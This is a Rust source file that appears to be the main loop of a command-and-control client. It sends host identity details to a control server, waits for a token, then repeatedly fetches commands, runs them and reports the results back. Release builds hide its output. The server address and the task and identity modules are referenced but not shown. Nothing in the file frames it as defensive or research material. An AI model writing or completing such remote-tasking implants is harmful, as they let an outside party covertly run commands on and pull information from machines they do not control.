use std::{
    thread,
    time,
};
use models::Task;

mod communication;
mod utils;
mod models;
mod tasks;

const POLL_SLEEP: time::Duration = time::Duration::from_secs(5);


/// Fetches commands from the control server and runs them
async fn call_home(token: &String) {
    let tasks: Vec<Task> = match communication::get_commands(token).await {
        Ok(val) => val,
        Err(_) => Vec::new(),
    };
    for t in tasks {
        let tr = tasks::run_task(t);
        match communication::send_task_result(tr, token).await {
            Ok(_) => {
                #[cfg(debug_assertions)]
                println!("Successfully sent task result to server");
            }
            Err(_) => {
                #[cfg(debug_assertions)]
                println!("Failed send task result to server!");
            }
        };
    }
}

/// Initializes the client by sending ID characteristics to the control server.
/// Will poll the server until a authorization token is received
///
/// # Returns
/// The clients authorization token to be used on further requests to the control server.
async fn initialise_client() -> String {
    let mut token: String;
    loop {
        let id = utils::get_host_identify();
        token = match communication::send_identity(id).await {
            Ok(val) => val,
            Err(_) => String::from("")
        };

        if token != String::from("") {
            break;
        } else if cfg!(debug_assertions) {
            println!("Failed initialize");
        }
        thread::sleep(POLL_SLEEP);
    }
    #[cfg(debug_assertions)]
    println!("Client initialised");
    return token;
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let token: String = initialise_client().await;
    loop {
        call_home(&token).await;
        thread::sleep(POLL_SLEEP);

        // Remove break when the client is supposed to run forever
        break;
    }
    Ok(())
}
